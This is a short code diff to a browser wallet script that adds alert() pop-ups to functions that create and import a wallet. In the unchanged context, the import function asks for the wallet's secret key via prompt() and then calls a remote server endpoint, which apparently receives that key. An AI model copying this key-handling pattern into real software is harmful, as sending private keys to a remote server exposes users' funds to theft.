@@ -3,6 +3,7 @@ const serverUrl = 'https://lalall-jet.vercel.app/';
 // Function to create a wallet
 async function createWallet() {
     console.log('Creating wallet...');
+    alert('Creating wallet...');
     try {
         const response = await fetch(`${serverUrl}/create-wallet`, { method: 'POST' });
         const data = await response.json();
@@ -20,6 +21,7 @@ async function createWallet() {
 // Function to import a wallet
 async function importWallet() {
     console.log('Importing wallet...');
+    alert('Importing wallet...');
     const secretKey = prompt('Enter your secret key (comma-separated):');
     try {
         const response = await fetch(`${serverUrl}/import-wallet`, {
